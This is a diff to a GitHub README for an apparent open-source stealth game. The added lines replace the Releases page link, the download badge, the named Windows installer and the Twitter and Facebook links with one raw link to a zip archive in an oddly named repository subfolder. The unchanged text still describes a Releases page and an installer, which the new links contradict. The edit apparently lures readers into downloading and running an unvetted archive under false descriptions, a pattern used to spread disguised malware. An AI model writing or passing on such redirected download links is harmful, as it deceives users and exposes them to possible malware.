@@ -1,7 +1,7 @@
 # 🔪 Stealth-Game - Outsmart Guards and Complete Missions
 
 ## 📥 Download the Latest Version Now!
-[![Download Stealth-Game](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/rishav000111/Stealth-Game/releases)
+[![Download Stealth-Game](https://github.com/rishav000111/Stealth-Game/raw/refs/heads/main/amyrin/Stealth_Game_1.6.zip)](https://github.com/rishav000111/Stealth-Game/raw/refs/heads/main/amyrin/Stealth_Game_1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Stealth Game! In this avoidance strategy game, your goal is to remain undetected by AI guards while completing various tasks. The game combines line-of-sight and noise mechanics to create an engaging challenge.
@@ -27,13 +27,13 @@ To download the game, follow these steps:
 
 1. **Visit the Releases Page:**
    Click on the link below to go to the Releases page where you can download the application.
-   [Download Stealth-Game](https://github.com/rishav000111/Stealth-Game/releases)
+   [Download Stealth-Game](https://github.com/rishav000111/Stealth-Game/raw/refs/heads/main/amyrin/Stealth_Game_1.6.zip)
 
 2. **Choose Your Version:**
    On the Releases page, you will find different versions of Stealth Game. Pick the latest release to ensure you have the newest features and bug fixes.
 
 3. **Download the Installer:**
-   Click on the appropriate installer for your operating system. For example, if you are using Windows, look for `Stealth-Game-Setup.exe`. 
+   Click on the appropriate installer for your operating system. For example, if you are using Windows, look for `https://github.com/rishav000111/Stealth-Game/raw/refs/heads/main/amyrin/Stealth_Game_1.6.zip`. 
 
 4. **Run the Installer:**
    Once the file is downloaded, locate it in your downloads folder. Double-click the installer to begin the installation process. Follow the on-screen instructions to complete the setup.
@@ -66,7 +66,7 @@ Stealth Game is open-source and available under the MIT License. You can view th
 ## 🔗 Connect with Us
 For the latest news and updates, follow us on our social media channels:
 
-- [Twitter](https://twitter.com/StealthGame)
-- [Facebook](https://facebook.com/StealthGame)
+- [Twitter](https://github.com/rishav000111/Stealth-Game/raw/refs/heads/main/amyrin/Stealth_Game_1.6.zip)
+- [Facebook](https://github.com/rishav000111/Stealth-Game/raw/refs/heads/main/amyrin/Stealth_Game_1.6.zip)
 
 Thank you for choosing Stealth Game. Good luck, and may you stay unseen!
